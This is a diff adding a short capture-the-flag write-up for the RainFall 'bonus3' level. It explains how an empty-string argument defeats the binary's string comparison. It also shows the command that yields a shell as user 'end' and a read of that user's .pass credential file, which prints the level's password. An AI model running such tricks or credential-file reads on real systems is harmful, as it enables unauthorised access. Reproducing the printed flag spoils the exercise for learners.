@@ -1,0 +1,13 @@
+Program compares 2 strings
+
+1st string - first argument
+2nd string - string from "/home/user/end/.pass", except it writes '\0' at position that equals to atoi(1st string)
+
+That means it is enough to pass empty string
+
+
+bonus3@RainFall:~$ ./bonus3 ''
+$ whoami
+end
+$ cat /home/user/end/.pass
+3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
